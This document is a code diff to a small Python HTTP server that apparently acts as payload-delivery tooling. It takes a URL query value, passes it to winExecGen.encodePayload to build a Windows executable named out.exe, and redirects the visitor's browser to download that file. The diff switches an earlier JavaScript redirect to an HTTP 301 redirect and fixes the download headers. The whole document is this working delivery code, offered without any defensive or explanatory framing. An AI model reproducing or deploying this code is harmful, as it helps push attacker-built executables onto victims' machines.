@@ -1,5 +1,5 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import urllib.parse, json, urllib, winExecGen, sys, shutil
+import urllib.parse, json, urllib, winExecGen, sys, shutil, os
 
 class GetHandler(BaseHTTPRequestHandler):
 
@@ -8,16 +8,19 @@ class GetHandler(BaseHTTPRequestHandler):
         print(parsed_path)
         if "/out.exe" in parsed_path:
             self.path = 'out.exe'
+            self.send_response(200)
+            self.send_header("Content-Type", 'application/x-msdownload')
             with open(self.path, 'rb') as f:
-                self.send_header("Content-type", "application/exe")
-                shutil.copyfileobj(f,self.wfile)
-            f.close()
+                fs = os.fstat(f.fileno())
+                self.send_header("Content-Length", str(fs.st_size))
+                self.end_headers()
+                self.wfile.write(bytes(f.read()))
+                print('hit')
         else:
             winExecGen.encodePayload("./out.exe", urllib.parse.unquote(parsed_path.query.split("=",1)[-1]))
-            message = "<script>window.location=\'http://"+sys.argv[1]+sys.argv[2]+"/out.exe\'</script>"
-            self.wfile.write(message.encode())
-        self.send_response(200)
-        self.end_headers()
+            self.send_response(301)
+            self.send_header('Location','http://'+ sys.argv[1] + ':' + sys.argv[2] + '/out.exe')
+            self.end_headers()
         return
 
 if __name__ == '__main__':
